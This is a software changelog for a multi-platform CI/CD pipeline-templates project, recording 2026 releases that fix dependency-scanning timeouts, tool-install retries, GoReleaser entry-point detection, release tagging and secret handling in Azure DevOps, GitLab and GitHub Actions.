# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

When a new release is proposed:

1. Create a new branch `bump/x.x.x` (this isn't a long-lived branch!!!);
2. The Unreleased section on `CHANGELOG.md` gets a version number and date;
3. Open a Pull Request with the bump version changes targeting the `main` branch;
4. When the Pull Request is merged, the `release.yaml` workflow automatically creates a Git tag and GitHub Release.

Releases to productive environments should run from a tagged version.
Exceptions are acceptable depending on the circumstances (critical bug fixes that can be cherry-picked, etc.).

## [Unreleased]

## [4.17.0] - 2026-07-22

### Added

- added a SonarQube analysis stage (`35-management`) to the Helm chart pipeline (`azure-devops/helm/helm-chart.yaml`), bringing it in line with the Go, Python, JavaScript and Terraform templates that already run the scanner. The new `azure-devops/helm/stages/35-management/helm.yaml` reuses the shared `azure-devops/global/stages/35-management/sonarqube.yaml` job with `DOWNLOAD_COVERAGE_ARTIFACT: false` (Helm charts produce no coverage artifact, so the download step is skipped to avoid turning the job yellow). Chart repositories that extend `azure-devops/helm/helm-chart.yaml` now report to SonarQube on every non-tag build with no per-repository change

### Changed

- ignored the compiled tool binaries (`bin/`) and the root-level test, coverage and SAST outputs (`cobertura.xml`, `coverage.txt`, `coverage.xml`, `junit.xml`, `reports/`) that the scripts write when run from a project that does not set `REPORT_PATH`. `bin/golangci-lint` and `global/containers/tor-proxy.latest/health/health` had been committed by accident and carried roughly 45 MB through every clone; both were purged from the history, and these entries stop a stray `make` run from re-adding them

### Fixed

- fixed the `sca:dependency-check` timeout being too tight for a legitimate cold build, raising it from 30 to 45 minutes on all three platforms (`.github/workflows/{maven,gradle}.yaml`, `gitlab/java/stages/20-security/{maven,gradle}.yaml`, `azure-devops/java/stages/20-security/java.yaml`). This is a safety net rather than the fix — the datafeed bootstrap is what brings a cold build back under the ceiling — so a pathological download is still killed instead of burning Actions minutes
- fixed the Java `sca:dependency-check` job timing out at 30 minutes on every run, which left it permanently red and produced no report. Two independent causes: (1) an NVD API key was treated as sufficient to use the NVD API, but a *cold* database bootstrap paginates ~350k records and a shared CI egress IP sustains only ~30 records/s even authenticated — over 3 hours, so no timeout short of the 6h job cap could have helped; (2) `github/java/stages/20-security/dependency-check/action.yaml` saved the cache under `always()`, so a killed run published its half-written database, the next run restored it, Dependency-Check rejected it and restarted the full download, and the loop could never escape. `global/scripts/languages/java/dependency-check/run.sh` now chooses the update mechanism by *database state* rather than by credential: a cold or partial database is bootstrapped from the rate-limit-free NVD datafeed regardless of the key, and the authenticated API is used only for the delta once a complete database is restored. Completion is recorded with a `.owasp/.odc-complete` marker that `run.sh` clears before running and writes only after the analysis returns, and the GitHub Actions `cache/save` step is gated on it so a partial database is never cached again
- fixed the Terragrunt install step in `azure-devops/terraform/abstracts/terra-terraform.yaml` failing with `./terragrunt: line 1016: syntax error: unexpected end of file`. Neither the release lookup nor the download was checked, so when the unauthenticated `api.github.com/repos/gruntwork-io/terragrunt/releases/latest` call was throttled -- shared CI runners share an egress IP and routinely exhaust the 60-requests-per-hour anonymous limit -- the `grep` matched nothing, the command substitution collapsed to an empty string, and `curl` wrote no usable binary; `chmod +x` then handed the resulting text file to the shell, which is where that syntax error came from. The install is now wrapped in a **3-attempt retry** with backoff, and an attempt only counts as successful once `terragrunt --version` actually runs, so a transient throttle or dropped transfer is retried rather than failing the build, and a genuine failure reports which step failed instead of a shell syntax error. The asset match is also anchored to the raw binary: upstream now publishes `terragrunt_linux_amd64.tar.gz` and `terragrunt_linux_amd64.zip` beside it, so the unanchored pattern matched three assets and expanded to three URLs against a single `-o`

## [4.16.0] - 2026-07-16

### Added

- added `.github/tests/test-goreleaser-prepare.sh` (wired into `make test`, and listed in `CLAUDE.md` and `.github/copilot-instructions.md` alongside the other targets), which runs `prepare.sh` against fixture project trees and asserts on the `main:` it writes: that an entry point embedded in a test fixture is never selected (with and without the Go toolchain available), that a root-level `main` package resolves to `.`, that the binary's own `cmd/<name>` wins when a repository ships several, that an explicit `binary_path` is honoured and normalized, that the fallback reads every package clause the compiler accepts — a trailing comment, a CRLF line ending — without mistaking `package maintenance` for one, and that a project's own `.goreleaser.yaml` is left untouched
- added `.github/tests/test-release-version-extraction.sh` (wired into `make test`) pinning the version that `40-delivery/release` derives from both a version-tag push and a bump commit message, including the `v` prefix, the four-segment fork variant (`X.Y.Z.N` / `X.Y.Z-N`), the non-version-tag skip, and the tag-ref-wins-over-commit-message precedence
- added `global/scripts/shared/reconcile-releases.sh`, a read-only detector for the "bumped but never released" failure mode: a bump PR merges to `main` but that `main` run fails the quality gate, so `delivery-release` never runs and no tag/release is cut even though `CHANGELOG.md` already carries the version. The script diffs the released `CHANGELOG.md` versions against the git tags and resolves each gap to its bump commit, printing one `version<TAB>commit<TAB>status` row per gap. It is run org-wide on a schedule by [`config-automation`](https://github.com/rios0rios0/config-automation) (alongside the compliance audit and config/docs refresh), which (re-)pushes each missing tag so the tag-push delivery path re-cuts the release. Covered by `.github/tests/test-release-reconcile.sh` (wired into `make test`)
- added a dead-input check to the Terragrunt `order-check` tool (`global/scripts/languages/terraform/order-check/check_order.py`): every `inputs = {}` key — in a `root.hcl` or a leaf `terragrunt.hcl` — that has no matching `variable` declaration in the target stack is reported as dead code. Terraform silently drops the `TF_VAR_` values Terragrunt exports for an undeclared variable (unlike `-var`, which warns), so such an input is passed and never read. The target stack is resolved from the file's literal `source` (or, for a leaf, the `root.hcl` it includes), falling back to a path convention (`environments/<path>` → `stacks/<path>`) when the source path is interpolated; a container directory with no `*.tf` of its own is skipped so its shared inputs are never mis-blamed on a single sub-stack, and variables declared in any `*.tf` (not only `variables.tf`) count as declared. Findings are **reported only, never auto-deleted** by `--fix` — deleting content would break the rewriter's round-trip-safety invariant, and the stack is resolved heuristically — so each finding names the exact keys for a human to remove before pushing. Extended `.github/tests/test-order-check.sh` with six scenarios covering `root.hcl` and leaf detection, a valid leaf staying clean, nested sub-stack resolution with the container root skipped, cross-file variable declarations, and the no-delete guarantee
- added a TypeScript type-check to the JavaScript `10-code-check` stage on Azure DevOps (`steps/eslint.yaml`) and GitLab (`javascript/stages/10-code-check/yarn.yaml`): after ESLint, the job runs the project's `typecheck` script when `package.json` declares one, falls back to `yarn tsc --noEmit` when a root `tsconfig.json` exists, and skips otherwise, logging a note so the gate's absence stays visible. ESLint, `knip`, and Vitest/Jest all transpile without type checking, so a type error (e.g. in a test file) previously passed the whole pull-request gate and only surfaced wherever `tsc` eventually ran — typically the post-merge delivery build. Plain-JavaScript projects are unaffected; GitHub Actions ships no JavaScript lint workflow yet, so there is nothing to mirror there

### Changed

- changed the release-delivery stage on **all three platforms** to also cut a release on a **version-tag push**, not only on a default-branch bump merge, so a bump whose gate run failed can be recovered by (re-)pushing its version tag (the release step derives the version straight from the tag ref). GitHub Actions: `github/global/stages/40-delivery/release` plus the `go-library`, `composer-library`, and `maven-library` workflows — whose `delivery-release` `if` now gates the two triggers separately with explicit status functions (`success()` on the main path, `!cancelled()` on the tag path) because every job in `go.yaml`/`composer.yaml`/`maven.yaml` skips on tags, which makes the gate need conclude `skipped` and an implicit `success()` would otherwise skip delivery too; `go-binary` already delivered on tags via GoReleaser. GitLab CI: `gitlab/global/stages/40-delivery/release.yaml` gained a `$CI_COMMIT_TAG` rule. Azure DevOps: `azure-devops/global/stages/40-delivery/release.yaml` extended its `condition` to `refs/tags/*`. The default-branch bump path is untouched on every platform

### Fixed

- fixed `prepare.sh` aborting with `SCRIPTS_DIR: unbound variable` when run outside the pipeline: the script runs under `set -u`, so the `[ -z "$SCRIPTS_DIR" ]` guard that was meant to derive the directory when the caller had not exported it could only ever crash, leaving its fallback unreachable
- fixed the `delivery:binary` job selecting the wrong package to build, which fails GoReleaser with `build for <name> does not contain a main function` — and does so *after* the release job has already published the tag and the GitHub Release, so the version stays up with no binaries attached to it and nothing to download or self-update from. When a consumer does not pin `binary_path`, `global/scripts/languages/golang/goreleaser/prepare.sh` located the entry point with `grep -rl "^func main()" --include="*.go" . | head -1`. That search is textual: it does not skip `_test.go`, does not read the package clause, and cannot tell that a match sits inside a raw string literal — so in a repository whose tests build sample Go programs as fixtures it matched the fixture, and since `grep -r` walks `internal/` before `cmd/`, `head -1` returned it and the real entry point was never even considered ([autobump#271](https://github.com/rios0rios0/autobump/pull/271) shows the failure: `Auto-detected main package at: ././internal/domain/commands`). Detection now asks the Go toolchain which packages are actually `main` (`go list -e -f '{{if eq .Name "main"}}{{.Dir}}{{end}}' ./...`), which reads the package clause and ignores tests and `testdata/`; when several exist, the one named after the binary is released, so a repository shipping `./cmd/api` and `./cmd/worker` no longer gets whichever sorted first. The text search is kept only as a fallback for when the toolchain is unavailable, and is now strict: `_test.go`, `testdata/` and `vendor/` are skipped and the file must actually declare `package main`
- fixed the Azure DevOps SonarQube steps depending on `SONAR_TOKEN` being a plain (non-secret) variable-group entry: the shared `report:sonarqube` job (`azure-devops/global/stages/35-management/sonarqube.yaml`, consumed by the golang/python/terraform/terra stacks), the JavaScript `yarn sonar` step, and the dotnet sonarscanner script now map `SONAR_TOKEN`/`SONAR_HOST_URL` into the step environment explicitly — Azure Pipelines withholds secret variables from the process environment, so without the mapping, marking the variable-group entry as secret silently broke every scan with `HTTP 401`; with it, the token can (and should) be stored as a secret
- fixed the generated `main:` being malformed even when detection happened to pick the right directory: it was built as `"./$(dirname "$DETECTED")"` over a path that already began with `./`, emitting `././cmd/app`, and a root-level entry point came out as `./.`. Paths are now normalized to the `./path` form GoReleaser expects, with the project root collapsing to `.`, and an explicitly passed `binary_path` is normalized the same way so that `cmd/app` and `./cmd/app` behave identically

## [4.15.0] - 2026-07-13

### Added

- added `.github/tests/test-dependency-check.sh` (wired into `make test`, and listed in `CLAUDE.md` and `.github/copilot-instructions.md` alongside the other targets), which runs the runner against a stub build tool and asserts on the arguments it actually passes — that the key reaches the plugin and never lands on the command line, that the database is pinned to the cached directory, that a keyless run falls back to the datafeed, and that the GitHub cache is saved under `always()`
- added `global/scripts/languages/java/dependency-check/`, a single Dependency-Check runner shared by GitHub Actions, GitLab CI and Azure DevOps. It resolves the CVE database into one absolute, cacheable directory (`.owasp/`), passes the API key by variable name, and reuses a cached database for 24h (`nvdValidForHours`) instead of Dependency-Check's 4h default. Gradle is configured through a shipped `init.gradle` applied with `--init-script`, because the Gradle plugin reads its settings *only* from the `dependencyCheck` extension — consuming projects need no `build.gradle` change
- added a 30-minute cap to the Dependency-Check job on all three platforms (`timeout-minutes`, `timeout`, `timeoutInMinutes`), so a pathological NVD download is bounded rather than trusted and can never again run for hours against the account's CI minutes
- added an NVD datafeed fallback for projects with no API key: rather than paginating ~174 API pages against the anonymous rate limit, the scan downloads NIST's gzipped JSON feeds, which are not rate limited. Set `NVD_DATAFEED_URL` to point at a self-hosted [`vulnz`](https://github.com/jeremylong/open-vulnerability-cli) mirror instead. An API key remains strongly recommended, and the job says so in its log
- added Dependency-Check report publishing to GitHub Actions and Azure DevOps, which previously ran the scan and discarded the report. Reports are now written to `build/reports/dependency-check/` on every platform, in line with the other tools

### Changed

- refreshed `.github/copilot-instructions.md` to list the `make test-trivy-merge` target and include Trivy merge in the `make test` aggregate description, matching the Makefile and `CLAUDE.md`

### Fixed

- fixed an unexpanded Azure DevOps `$(NVD_API_KEY)` macro (what an undefined pipeline variable expands to) being forwarded to the NVD as a literal API key, which earns a 403 on every request
- fixed the NVD API key being passable in a way that leaks it: `-DnvdApiKey=<value>` puts the secret in the process arguments and in `mvn -X` output ([GHSA-qqhq-8r2c-c3f5](https://github.com/advisories/GHSA-qqhq-8r2c-c3f5)). The runner now passes `-DnvdApiKeyEnvironmentVariable=NVD_API_KEY`, handing the plugin the *name* of the variable so it reads the value itself
- fixed the OWASP Dependency-Check job downloading the whole NVD (~350k CVE records) on every run, which took upwards of 5h45m and had to be cancelled before it exhausted the account's CI minutes. Three defects stacked up: (1) the `NVD_API_KEY` secret was plumbed all the way to the job as an **environment variable**, which neither plugin reads — the Maven plugin wants a `nvdApiKey*` user property and the Gradle plugin wants the `dependencyCheck.nvd.apiKey` extension — so every run was silently unauthenticated and throttled to the NVD's 5-requests-per-30s anonymous limit, which is shared across every job leaving a hosted runner's IP; (2) the CVE database was never written where the pipelines cached it (Gradle's `OWASP_PATH` export was read by nothing, so the database went to `$GRADLE_USER_HOME/dependency-check-data/` while an empty `.owasp/` was cached), and Maven's data directory was smuggled in through `MAVEN_OPTS`; (3) GitHub Actions used the all-in-one `actions/cache`, whose save runs in a post-job step that is **skipped on cancellation** — so the cancelled run cached nothing and the next run started cold again, a loop the cache could never escape

## [4.14.1] - 2026-07-10

### Changed

- changed the golang pipeline version from `1.26.4` to `1.26.5`
- changed the terraform pipeline version from `1.15.7` to `1.15.8`
- changed Trivy ignore handling so the global ignore shipped in pipelines (`global/scripts/tools/trivy/.trivyignore`) is now ALWAYS applied and each project's own root `.trivyignore` is APPENDED to it, instead of the project file overriding the global one entirely (the old behavior copied the global default in only when the project had none). Both `global/scripts/tools/trivy/run.sh` (IaC misconfiguration) and `run-sca.sh` (dependency SCA) now build a merged ignore file and pass it to Trivy via `--ignorefile`, mirroring the global+repo merge already used for `.golangci.yml` and `.gitleaks.toml`. This gives one central, curated place to suppress fleet-wide, well-understood false positives while projects keep their own entries; the merged file is built outside the working tree, so the project checkout is no longer mutated. Seeded the global file with `GO-2026-5932` (the `golang.org/x/crypto/openpgp` deprecation, published 2026-07-07): Trivy's `gomod` scanner flags the whole `golang.org/x/crypto` module, but the Go services here use it only for ssh/hashing/cipher primitives and never import `openpgp` (confirmed by `go mod why golang.org/x/crypto/openpgp` reporting "does not need package" and by the reachability-aware `sca:govulncheck` job passing). Added `.github/tests/test-trivy-merge.sh`, wired into `make test`, to cover the merge and guard against unjustified global-ignore drift

### Fixed

- fixed the `azure-devops/terra` template family never creating a Git tag when a version-bump pull request is merged to `main`. Every other Azure DevOps family (`golang`, `java`, `javascript`, `python`, `terraform`, `helm`) wires the shared `azure-devops/global/stages/40-delivery/release.yaml` job into its `delivery` stage, but `terra` deliberately ships no `40-delivery` stage because its consumers own the plan/apply stage — and the release job was dropped along with it. Consumers of `terra` therefore had to hand-create every tag, which is invisible until you notice the repositories accumulate *lightweight, tagger-less* tags rather than the annotated tags the release job produces (and that repositories which never hand-tagged simply have none). Added `azure-devops/terra/stages/40-delivery/release.yaml` and wired it into `azure-devops/terra/terra.yaml`. It reuses the shared release job unchanged — the existing version-extraction regex already recognises the `chore(bump): bumped version to X.Y.Z` subject that a squash/rebase merge produces
- fixed the `Generate CycloneDX BOM` step (`report:dependency-track` job, Terraform / `terra` templates) failing on fresh CI agents with `mv: cannot move '/tmp/trivy' to '/home/vsts/.local/bin/trivy': No such file or directory`. Every other tool script gets `~/.local/bin` created and put on PATH by the shared `cleanup.sh` preamble, but `global/scripts/languages/terraform/cyclonedx/run.sh` intentionally does not source that preamble (without `TOOL_NAME` it wipes the whole reports directory) — yet its Trivy install block, mirrored from `global/scripts/tools/trivy/run.sh`, still assumed the preamble had run. The script now replicates the preamble's install-target setup itself (`mkdir -p "$HOME/.local/bin"` plus the idempotent PATH prepend), which also lets a Trivy installed by an earlier job on the same persistent agent be found and reused instead of re-downloaded every run
- named the new `terra` stage `release` rather than `delivery`, because `terra` consumers already declare a `delivery` stage of their own and a duplicate stage id makes Azure DevOps refuse to compile the pipeline (`The stage name delivery appears more than once`) — that collision is why the job could not simply be copied over from the `terraform` family. The stage gates on `in(dependencies.management.result, 'Succeeded', 'SucceededWithIssues')` rather than on a condition helper: the `terraform` family's `not(failed())` is also true when `management` was *skipped*, which is what an earlier failing stage produces, so a commit that never passed code-check, security, or tests would still get tagged; and `succeeded()` leaves the treatment of `SucceededWithIssues` — the normal result whenever a best-effort SonarQube or Dependency-Track job fails under `continueOnError` — to a helper, which is not worth the doubt when the output is a production tag

## [4.14.0] - 2026-07-03

### Added

- added an env-overridable `TRIVY_PINNED_VERSION` (default `v0.72.0`) last-resort fallback to the Trivy install path in `global/scripts/tools/trivy/run.sh`, `run-sca.sh`, and `global/scripts/languages/terraform/cyclonedx/run.sh`. The normal path still installs the `latest` Trivy, but when the upstream `install.sh` `latest` tag lookup transiently fails — a rate-limited or empty GitHub response makes it log `unable to find ''` and drop no binary, historically failing `sast:trivy` / `sca:trivy` mid-run — the scripts now retry once against the explicit pinned release before failing the stage. Set `TRIVY_PINNED_VERSION` to any tag from https://github.com/aquasecurity/trivy/releases to override. Mirrors the existing `HADOLINT_PINNED_VERSION` hardening

### Changed

- changed the Azure DevOps `terra` management-stage step display names to sentence case — `generate CycloneDX BOM` → `Generate CycloneDX BOM` and `upload BOM to Dependency-Track` → `Upload BOM to Dependency-Track` (`azure-devops/terra/stages/35-management/terra.yaml`)
- changed the tool-install scripts under `global/scripts/` to install without root. pip (`vulture`) and gem (`debride`) installs now use `--user` / `--user-install`, and the downloaded binaries (`gitleaks`, `shellcheck`, `hadolint`, `trivy`) land in the current user's `~/.local/bin` instead of `/tmp` — the CodeQL bundle goes to `~/.local/share` with its launcher symlinked into `~/.local/bin`, and Semgrep's venv likewise. The shared `cleanup.sh` preamble now ensures `~/.local/bin` exists and is on PATH (pipeline/CI shells are frequently non-login and don't pick it up from the user's profile). Besides removing any need for `sudo`, installing to `~/.local/bin` makes the tools persist across runs on a self-hosted agent, so the self-update above actually engages instead of the tool being reinstalled from scratch every run
- changed the tool-install scripts under `global/scripts/` to self-update an already-installed tool on persistent (self-hosted) agents instead of skipping it, so long-lived runners stay current for CVE fixes rather than pinning whatever version was first installed — ephemeral CI runners are unaffected, since the tool is never pre-present there and the install branch runs as before. Package-manager tools use their native, version-aware upgrade (`vulture`/`semgrep` → `pip install --upgrade`, `debride` → `gem update`, `phpmd` → `composer global update`, `go-junit-report` → `go install @latest`); binary-release tools (`gitleaks`, `shellcheck`, `hadolint`, and `trivy` in `tools/` plus `languages/terraform/cyclonedx`) gain a fail-safe version check that re-fetches the `releases/latest` binary only when the installed version is behind — resolved via the `releases/latest` redirect (not the rate-limited GitHub API), and any lookup or parse uncertainty is treated as "no update", so a transient blip never forces a needless download or breaks the run. CodeQL is intentionally excluded because its ~1 GB bundle has no lightweight version handle and re-downloading it per run would cost more than the staleness it avoids

### Fixed

- fixed the `report:dependency-track` BOM upload being rejected with HTTP 400 `{"detail":"Unrecognized specVersion 1.7"}` after Trivy `0.71.0`+ began emitting CycloneDX 1.7: `global/scripts/languages/terraform/cyclonedx/run.sh` now down-encodes the generated BOM's `specVersion` (and `$schema`) to the highest spec Dependency-Track can ingest — `DT_CYCLONEDX_MAX_SPEC_VERSION`, default `1.6` — because Trivy exposes no spec-version flag and DT's 1.7 support is still open upstream (`DependencyTrack/dependency-track#5818`, blocked on `cyclonedx-core-java`). The rewrite only ever lowers the version (Trivy uses no 1.7-specific fields, so the result strict-validates as 1.6) and is a no-op once DT ingests 1.7 or the pin is raised
- fixed the `report:dependency-track` job (Terraform / `terra` template) failing every build with `curl: (22) The requested URL returned error: 400` on the BOM upload. `global/scripts/tools/dependency-track/run.sh` looked up the existing project's UUID via `GET /api/v1/project/latest/<name>` and then POSTed the BOM with `project=<uuid>` **and** `projectVersion=<version>` together — but Dependency-Track's `/api/v1/bom` treats `project` (UUID) and `projectName`/`projectVersion` as mutually exclusive and rejects a request carrying both (since 4.12), so every build after the project's first upload `400`'d (the UUID lookup only misses on the very first run, which is why the job was "always breaking"). The upload now uses only `projectName` + `projectVersion` + `autoCreate=true` (an idempotent upsert, with `isLatest=true` flagging the latest version) and drops the UUID lookup entirely; it also captures the HTTP status and echoes Dependency-Track's response body on failure instead of hiding it behind `curl --fail`, so a future rejection is diagnosable from the pipeline log. TLS certificate verification is now on by default (the previous unconditional `curl --insecure` sent the `X-Api-Key` token over an unverified connection); set `DEPENDENCY_TRACK_INSECURE=1` to opt back out for a self-signed / private-CA endpoint
- fixed the `report:dependency-track` job failing with `curl: (22) ... HTTP 400` for every Python integrator: `global/scripts/languages/python/cyclonedx/run.sh` generated the BOM with `cyclonedx-py environment` (which emits no root `metadata.component`) and then hand-built the component via `jq` with only `name` and `version`, omitting the schema-required `component.type`, so Dependency-Track (>= 4.11, BOM validation on by default) rejected every upload — and because the job runs with `continueOnError`/`allow_failure`, builds finished `partiallySucceeded` while no SBOM was ever ingested. The root component is now populated by `cyclonedx-py` itself from the project's `pyproject.toml` (`--pyproject`), and since not every PDM project is an application, the component type is derived from PDM's own library marker under `[tool.pdm]` (`distribution = true`, or the older `package-type = "library"`, yields `library`; anything else defaults to `application`), with a `CYCLONEDX_MC_TYPE` environment variable available to force any valid CycloneDX type per project. Only `version` is still injected via `jq`, since PEP 621 allows it to stay dynamic and be resolved by the build backend
- fixed the release/tag automation not running when a version-bump PR is merged via rebase or squash. The `delivery-release` gate in every language reusable workflow (`go-binary`, `go-library`, `go-docker`, `maven-library`, `maven-docker`, `npm-library`, `npm-docker`, `yarn-library`, `yarn-docker`, `pdm-library`, `pdm-docker`, `gradle-library`, `gradle-docker`, `composer-library`, `composer-docker`, `bundler-library`, `bundler-docker`, `dotnet-library`, `dotnet-docker`, and `release.yaml`) only matched the merge-commit message form (`chore/bump-X.Y.Z` — the bump branch name, which lands in the commit message only when the PR is merged with a merge commit). Rebase and squash merges put the conventional-commit form (`chore(bump): bumped version to X.Y.Z`) on the head commit, so the gate skipped the release job and no tag/GitHub Release was created — even though the release action already parses both forms. The gate now also matches `chore(bump)`, so a release is cut regardless of the merge strategy

## [4.13.0] - 2026-06-30

### Added

- added `SYSTEM_ACCESSTOKEN: $(System.AccessToken)` to the `env:` of the Azure DevOps CodeQL step (`azure-devops/global/stages/20-security/codeql.yaml`) and the Go `Load Custom Configuration` step (`azure-devops/golang/abstracts/go.yaml`). Both source the project `config.sh`, which can authenticate private module fetches with the built-in pipeline identity instead of a hand-managed PAT; Azure Pipelines withholds `System.AccessToken` from the script environment unless mapped explicitly
- added a `TEST_ENV` object parameter to the Azure DevOps Go test stage (`azure-devops/golang/stages/30-tests/go.yaml`, `go-with-registry.yaml`) and its abstract (`azure-devops/golang/abstracts/test.yaml`). It maps the supplied key/value pairs onto the `Run Tests` step's `env:`, so secret-backed settings (which Azure Pipelines withholds from script-step environments) reach the test process. Defaults to empty, leaving existing consumers unchanged
- added a `VERSION` variable to `makefiles/golang.mk`, derived from the latest versioned heading in the consuming project's `CHANGELOG.md` (then the most recent Git tag, then `dev`). Go projects that bake `-X main.version=$(VERSION)` now report the current `CHANGELOG.md` version from `make build`/`make install` even when Git tags lag behind a release, fixing stale `version` and `self-update` output. A project's own `VERSION ?=` line (included after this file) is transparently overridden; an explicit `VERSION` from the environment or command line still wins

### Changed

- changed the terraform pipeline version from `1.15.6` to `1.15.7`

### Fixed

- fixed the Go code-check (`style:golangci-lint`) job intermittently exceeding golangci-lint's load timeout on larger projects, surfacing as `context loading failed: ... context deadline exceeded` after a full stall. The `Cache@2` task in `azure-devops/golang/abstracts/go.yaml` persisted only `$(GOPATH)` (the Go module cache) while Go's build cache stayed at its default `~/.cache/go-build`, outside the cached path — so every run recompiled the entire dependency graph from scratch. Compounding this, the cache key was pinned to `go.sum` with no `restoreKeys`, so any branch that changed its dependencies produced a total cache miss with no fallback and re-downloaded every module. `GOCACHE` is now set inside `$(GOPATH)` (`azure-devops/golang/stages/10-code-check/go.yaml`) so the build cache is persisted and restored between runs, and a `restoreKeys` fallback lets a branch whose `go.sum` changed restore the most recent cache (e.g. `main`'s) instead of starting cold
- fixed the TFLint install steps reinstalling TFLint on every run instead of skipping it when already on `PATH`. The `install_linux.sh` install is now guarded with `command -v tflint`, matching the conditional-install pattern the other tool scripts already use, across the Azure DevOps, GitLab, and GitHub Actions Terraform code-check stages (`azure-devops/{terra,terraform}/stages/10-code-check/terra.yaml`, `gitlab/{terra,terraform}/stages/10-code-check/terra.yaml`, `.github/workflows/terra.yaml`). Besides the wasted time, the unconditional install wrote to `/usr/local/bin` on every run, which fails on runners/agents where that path is not writable without an interactive `sudo` even when a suitable `tflint` is already present

## [4.12.3] - 2026-06-22

### Fixed

- fixed `global/scripts/tools/hadolint/run.sh` failing the `sast:hadolint` job with a cryptic `hadolint: not found` (exit `127`) whenever GitHub's `releases/latest` API was rate-limited or returned a transient `5xx` (e.g. `504`). The script resolves the version to download by parsing `tag_name` from that API, but the `curl | grep | sed` pipeline reports only `sed`'s exit status, so a failed `curl` silently produced an empty `HADOLINT_VERSION`; the empty value then flowed into a malformed download URL (`.../download//hadolint-Linux-x86_64`) that `404`s, the binary was never written, and the failure only surfaced at the subsequent lint call. The install path is now hardened, mirroring the Trivy install-retry idiom in `global/scripts/tools/trivy/run.sh`: the latest-version lookup and the binary download are each wrapped in a bounded linear backoff (3 attempts, `attempt × 5s`); the resolved version is validated non-empty and falls back to a pinned `HADOLINT_PINNED_VERSION` (default `v2.14.0`, env-overridable) otherwise; the downloaded binary is verified to actually run (`hadolint --version`) before linting, with the pinned version tried as a last resort if the resolved one will not execute; and an unrecoverable install now fails fast with an actionable error instead of falling through to exit `127`. The script stays POSIX-`sh` compatible and ShellCheck-clean

## [4.12.2] - 2026-06-18

### Changed

- bumped the `golang.1.26-awscli` container floor and the GitLab `golang` abstract image from `1.26.3` to `1.26.4`, aligning them with the `GoTool@0` version already used by the Go code-check/test stages. With `GOTOOLCHAIN=auto` now in place this floor is no longer load-bearing for build correctness; it only provides a current launcher and a sane baseline for offline cold-starts
- changed the terraform pipeline version from `1.15.5` to `1.15.6`

### Fixed

- fixed `global/scripts/languages/terraform/terra-test/run.sh` failing the entire tier-1 module test suite when `registry.terraform.io` returned a transient `502`/`503`. The runner runs `terraform init -upgrade` once per module, and `-upgrade` re-queries the public registry for provider version metadata on every module (the shared `TF_PLUGIN_CACHE_DIR` caches the provider binaries but not the registry round-trip), so a tree of dozens of modules makes dozens of independent registry calls — any single transient 5xx during one module's `init` would set the suite's exit code to `1` before that module's `terraform test` ever ran, surfacing as the confusing "all test cases passed, 0 failed, but the task exits 1" contradiction (the failed module emits no JUnit, so its failure is invisible in the aggregated case counts). `terraform init` is now wrapped in a bounded linear backoff (`terraform_init_with_retry`, default 4 attempts with `attempt × 5s` delay, overridable via `TF_INIT_MAX_ATTEMPTS` / `TF_INIT_RETRY_DELAY`), mirroring the existing Trivy install-retry idiom in `global/scripts/tools/trivy/run.sh`; `terraform test` is deliberately not retried so genuine test failures still surface immediately and deterministically
- fixed the `40-delivery/release.yaml` job silently skipping tag/release creation when a bump PR is auto-merged (e.g. by code-guru's trivial-PR auto-complete) instead of squash-merged through the UI. The auto-merge produces a GitHub-style merge commit (`Merge pull request N from chore/bump-X.Y.Z into main`) whose subject carries the version only in the branch name, so neither the `Merge branch '...'` nor the `chore(bump): ... version to X.Y.Z` pattern matched: the job skipped while the build still reported success, leaving the release untagged and undeployed. The version-extraction regex on both the Azure DevOps and GitLab CI release jobs now also recognizes the GitHub-style PR-merge subject (the leading `#` and trailing ` into <target>` are both optional); the GitLab job additionally gained the conventional-commit alternative (and matching `rules:` gate) it was missing, bringing all three platforms (GitHub Actions, GitLab CI, Azure DevOps) to parity
- fixed the Go Lambda SAM delivery/deployment stages breaking whenever a consumer bumps its `go.mod` `go` directive for a security patch (e.g. `go 1.26.4` against the `golang:1.26-awscli` container's baked-in `1.26.3`), failing with `go.mod requires go >= 1.26.4 (running go 1.26.3; GOTOOLCHAIN=local)`. The `40-delivery/lambda.yaml` and `50-deployment/lambda.yaml` jobs (and the GitLab `golang` abstract) now set `GOTOOLCHAIN=auto`, so `aws-lambda-builders` (which inherits the job env and only overrides `GOOS`/`GOARCH`) lets `go build` transparently fetch the exact toolchain each consumer's `go.mod` declares. The pipeline no longer has to chase Go patch bumps in lockstep with consuming repositories

## [4.12.1] - 2026-06-09

### Changed

- refreshed `CLAUDE.md` and `.github/copilot-instructions.md` to document the `make test-basic-checks` target and include `basic-checks` in the aggregate `make test` description, matching the `Makefile` after the chlog-based changelog validation work landed

### Fixed

- fixed `quality:proguard` job always failing on Java 21 / Spring Boot projects: ProGuard exits non-zero while reading certain `module-info` class files from dependencies even when no dead code exists, and `global/scripts/languages/java/proguard/run.sh` propagated that raw exit code with the cause hidden (output discarded to `/dev/null`). The script now decides pass/fail from the `-printusage` dead-code report rather than ProGuard's exit status, always surfaces ProGuard's output for diagnosability, and treats a non-zero exit with an empty report as a non-blocking warning
- fixed `sca:composer-audit` GitHub Actions job in `composer.yaml` always exiting with code `1` for PHP projects that have no `require` packages (only platform constraints like `php: >=7.2`). The step previously ran bare `composer audit` without a prior `composer install`, which fails with `No installed packages found` even after install when the lock file has zero packages. The step now installs first and skips the audit when zero packages are present, printing `No packages to audit.` to make the intent explicit; projects with real package dependencies continue to run the full `composer audit` and will still fail on any advisory
- fixed `sca:trivy` and `sast:trivy` jobs aborting with a FATAL error on Java/Maven projects when Maven Central rate-limits the runner with HTTP `429` (`Retry-After: 1800`). Trivy's analyzers resolve parent POMs and BOM-managed versions from the remote registry; when that registry is unreachable the scan now retries once with `--offline-scan` against locally resolvable dependencies instead of failing the job, in both `global/scripts/tools/trivy/run.sh` (IaC misconfiguration scan) and `global/scripts/tools/trivy/run-sca.sh` (dependency vulnerability scan). Online coverage is preserved whenever the registry is reachable, and the dedicated OWASP `dependency-check` job still provides authoritative deep SCA
